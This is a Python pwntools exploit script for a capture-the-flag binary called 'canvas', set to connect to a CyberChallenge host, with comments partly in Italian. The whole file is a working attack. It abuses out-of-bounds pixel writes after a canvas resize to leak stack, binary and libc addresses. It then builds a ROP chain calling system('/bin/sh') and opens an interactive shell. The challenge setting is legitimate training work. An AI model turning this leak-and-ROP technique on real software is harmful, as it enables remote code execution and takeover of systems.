#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canvas_patched
from pwn import *
import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF('canvas_patched')

host = args.HOST or 'canvas.challs.cyberchallenge.it'
port = int(args.PORT or 9603)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
    

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0000555555555642
continue
'''.format(**locals())

# b *0x00005555555555b4

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

def write_pixel(x, y, value):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'X:', str(x))
    io.sendlineafter(b'Y:', str(y))
    io.sendlineafter(b'):', str(value))

def resize(dim):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'dimension:', f"{dim}")

    
io = start()

write_pixel(0,0,255)


resize(32)

# ricevo canvas
io.sendlineafter(b'>', b'3')
sleep(1)
io.recvline()
io.recvline()

io.recv(516)

_leak_stack = io.recv(48)
leak_stack_str = ""
for i in range(7, -1, -1):
    leak_stack_str += _leak_stack[i*6-2:i*6].decode()
canvas_stack = hex(int(leak_stack_str, 16) - 0x484)[2:]
# canvas_stack = hex(int(leak_stack_str, 16) - 0x480 + 900)[2:]
info(f"{leak_stack_str=}")
info(f"{canvas_stack=}")

io.recv(48)

_leak_bin = io.recv(48)
leak_bin_str = ""
for i in range(7, -1, -1):
    leak_bin_str += _leak_bin[i*6-2:i*6].decode()
bin_base = int(leak_bin_str, 16) - 0x156e
info(f"{hex(bin_base)=}")

io.recv(804-516-48*3)

_leak_libc = io.recv(48)
leak_libc_str = ""
for i in range(7, -1, -1):
    leak_libc_str += _leak_libc[i*6-2:i*6].decode()
leak_libc = int(leak_libc_str, 16)
info(f"{hex(leak_libc)=}")
libc_base = leak_libc - 0x24083
print(hex(libc_base))
libc_one_gadget = hex(libc_base + 0xe3b01)[2:]
libc_one_gadget = "0000" + libc_one_gadget
# scrivo sullo stack una rop che imposta i registri in maniera corretta e poi chiama il onegadget

# in canvas_stack
# pop = hex(bin_base + 0x00000000000016ac)[2:]
# for i in range(7):
#     write_pixel(0+i,0, int(pop[12-i-2:12-i], 16))

# in canvas_stack-32
# print(libc_one_gadget)
# for i in range(7):
#     write_pixel(0+i,1, int(libc_one_gadget[12-i-2:12-i], 16))

# return add
# for i in range(7):
#     write_pixel(20+i,28, int(canvas_stack[12-i-2:12-i], 16))

#return add
system = hex(libc_base + 0x52290)[2:]
system = "0000" + system

pop_rdi = "0000" + hex(libc_base + 0x23b6a)[2:]

bin_sh = "0000" + hex(libc_base + 0x1b45bd)[2:]

resize(60)

# for i in range(8):
#     write_pixel(20+i,28, int(libc_one_gadget[16-i*2-2:16-i*2], 16))

for i in range(8):
    write_pixel(16+i,15, int(pop_rdi[16-i*2-2:16-i*2], 16))

for i in range(8):
    write_pixel(24+i,15, int(bin_sh[16-i*2-2:16-i*2], 16))

ret = "0000" + hex(libc_base + 0x22679)[2:]
for i in range(8):
    write_pixel(32+i,15, int(ret[16-i*2-2:16-i*2], 16))

# print(libc_one_gadget)
for i in range(8):
    write_pixel(40+i,15, int(system[16-i*2-2:16-i*2], 16))

io.sendlineafter(b'>', b'*')

io.interactive()

